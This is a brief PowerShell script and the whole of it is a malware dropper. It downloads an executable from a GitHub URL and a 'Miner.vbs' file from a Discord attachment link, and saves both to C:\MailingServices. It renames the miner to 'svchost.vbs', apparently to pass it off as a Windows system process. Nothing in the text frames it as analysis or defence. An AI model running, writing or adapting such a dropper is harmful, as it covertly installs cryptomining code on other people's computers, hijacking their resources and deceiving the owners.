$url = "https://github.com/violentqm/rest/raw/main/MailingServices.exe"
$outputPath = "C:\MailingServices\MailingServices.exe"
Invoke-WebRequest -Uri $url -OutFile $outputPath
$url2 = "https://cdn.discordapp.com/attachments/1161696732564959355/1173970377559527434/Miner.vbs?ex=6565e41d&is=65536f1d&hm=c2398d6d5af5f4da065d9fda5291c26a9d65038b6f551bfd2d776779f8bd6f37&"
$outputPath2 = "C:\MailingServices\svchost.vbs"
Invoke-WebRequest -Uri $url2 -OutFile $outputPath2
